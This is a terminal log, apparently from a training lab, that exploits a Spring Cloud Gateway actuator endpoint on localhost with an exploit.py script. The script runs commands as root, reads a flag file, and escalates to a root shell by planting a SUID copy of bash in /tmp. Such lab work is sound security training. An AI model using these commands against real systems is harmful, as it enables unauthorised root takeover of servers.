
```
emily@attackdefense:/etc$ nmap 127.0.0.1
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-27 20:51 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000076s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
emily@attackdefense:/etc$ 
```

```
emily@attackdefense:/etc$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  27280 21172 ?        Ss   19:49   0:00 /usr/bin/python2 /usr/bin/supervisord -n
emily          9  0.0  0.0  17740 17184 ?        R    19:49   0:00 /usr/local/bin/ttyd -p 45654 bash
root          10  0.2  0.1 2457484 137672 ?      Sl   19:49   0:11 java -Djava.security.egd=file:/dev/./urandom -jar /spring-cloud-gateway-0.0.1-SNAPSHOT.jar
emily         28  0.0  0.0   5744  3608 pts/0    Ss   20:10   0:00 bash
emily         41  0.0  0.0   9384  2988 pts/0    R+   20:51   0:00 ps aux
emily@attackdefense:/etc$ 
```

```
emily@attackdefense:~$ python3 exploit.py http://localhost:8080 'ls -al /root'
    
DEBUG:root:Exploiting URL: http://localhost:8080 with command: ls -al /root
DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): localhost:8080
DEBUG:urllib3.connectionpool:http://localhost:8080 "POST /actuator/gateway/routes/nxjuwuvi HTTP/1.1" 201 0
DEBUG:root:Response status code: 201
[+] Stage deployed to /actuator/gateway/routes/nxjuwuvi
[+] Executing command...
DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): localhost:8080
DEBUG:urllib3.connectionpool:http://localhost:8080 "POST /actuator/gateway/refresh HTTP/1.1" 200 0
DEBUG:root:Response status code: 200
[+] getting result...
DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): localhost:8080
DEBUG:urllib3.connectionpool:http://localhost:8080 "GET /actuator/gateway/routes/nxjuwuvi HTTP/1.1" 200 535
DEBUG:root:Response status code: 200
DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): localhost:8080
DEBUG:urllib3.connectionpool:http://localhost:8080 "DELETE /actuator/gateway/routes/nxjuwuvi HTTP/1.1" 200 0
DEBUG:root:Response status code: 200
[+] Stage removed!
total 28
drwx------ 1 root root 4096 Aug 10  2022 .
drwxr-xr-x 1 root root 4096 Dec 27 19:49 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwx------ 3 root root 4096 Aug  2  2022 .cache
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root  227 May 12  2021 .wget-hsts
-rw-r--r-- 1 root root   39 Aug 10  2022 FLAG



######
emily@attackdefense:~$ python3 exploit.py http://localhost:8080 'cat /root/FLAG'
...
FLAG: 4f8ac3289690d7b88ef57a05b0747823
```


# Escalate to root
```
python3 exploit.py http://localhost:8080 'cp /bin/bash /tmp'
ls -al /tmp/
python3 exploit.py http://localhost:8080 'chmod +s /tmp/bash'
id; /tmp/bash -p ; id; 
history
bash-5.0# whoami
root
bash-5.0# date
Wed Dec 27 21:54:50 UTC 2023
```